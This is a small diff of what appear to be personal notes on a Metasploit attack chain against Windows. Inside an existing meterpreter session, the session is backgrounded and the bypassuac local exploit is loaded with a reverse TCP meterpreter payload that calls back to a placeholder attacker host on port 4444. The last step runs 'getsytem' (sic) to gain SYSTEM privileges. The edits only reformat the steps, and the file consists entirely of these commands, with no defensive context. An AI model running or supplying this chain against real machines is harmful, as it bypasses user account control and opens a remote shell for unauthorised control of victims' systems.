@@ -1,18 +1,20 @@
 in meterpreter session
 
-put backgroud session
+put backgroud session:
 
 $ background
 
-new exploit config
+new exploit config:
 
-use exploit/windows/local/bypassuac
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST attackerip
-set LPORT 4444
-set SESSION idSessioneBackground
-exploit
-
-getsytem
+	use exploit/windows/local/bypassuac
+	set PAYLOAD windows/meterpreter/reverse_tcp
+	set LHOST attackerip
+	set LPORT 4444
+	set SESSION idSessioneBackground
+	exploit
+	
+on meterpreter
+	
+	getsytem
 
 	
